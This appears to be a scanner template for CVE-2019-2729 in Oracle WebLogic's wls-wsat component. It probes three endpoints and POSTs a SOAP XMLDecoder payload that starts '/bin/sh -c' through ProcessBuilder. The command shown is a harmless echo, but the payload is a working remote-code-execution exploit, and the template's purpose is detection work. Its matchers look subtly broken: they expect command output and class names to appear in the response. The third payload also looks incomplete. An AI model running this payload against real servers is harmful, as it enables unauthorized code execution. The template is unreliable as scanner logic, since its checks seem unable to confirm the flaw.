id: CVE-2019-2729

info:
  name: Oracle WebLogic Server wls-wsat Component Deserialization RCE (CVE-2019-2729)
  author: psibot 
  severity: critical
  description: |
    Vulnerability in the Oracle WebLogic Server wls-wsat component allows
    unauthenticated attackers with network access via HTTP to execute arbitrary code.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-2729
    - https://www.oracle.com/security-alerts/alert-cve-2019-2729.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-2729
  tags: cve,cve2019,weblogic,rce,oracle,deserialization,wls-wsat

http:
  - method: GET
    path:
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType"
      - "{{BaseURL}}/wls-wsat/RegistrationPortTypeRPC"
      - "{{BaseURL}}/wls-wsat/ParticipantPortType"
    
    matchers:
      - type: word
        words:
          - "CoordinatorPortType"
          - "RegistrationPortType"
          - "wsdl:definitions"
        condition: or
        part: body
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType"
    
    headers:
      Content-Type: text/xml
      Accept: '*/*'
    
    body: |
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8" class="java.beans.XMLDecoder">
              <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                  <void index="0">
                    <string>/bin/sh</string>
                  </void>
                  <void index="1">
                    <string>-c</string>
                  </void>
                  <void index="2">
                    <string>echo CVE-2019-2729-TEST</string>
                  </void>
                </array>
                <void method="start"/>
              </void>
            </java>
          </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
      </soapenv:Envelope>
    
    matchers:
      - type: word
        words:
          - "CVE-2019-2729-TEST"
        part: body
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "java.lang.ProcessBuilder"
        part: body

    extractors:
      - type: regex
        name: version
        internal: true
        regex:
          - 'WebLogic Server.*?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'

  - method: POST
    path:
      - "{{BaseURL}}/wls-wsat/RegistrationPortTypeRPC"
    headers:
      Content-Type: text/xml
    body: |
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java><class><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void><array class="byte" length="3"><void index="0"><byte>1</byte></void></array></void></class></java>
          </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
      </soapenv:Envelope>
    matchers:
      - type: word
        words:
          - "weblogic.wsee"
          - "UnitOfWorkChangeSet"
        condition: or
        part: body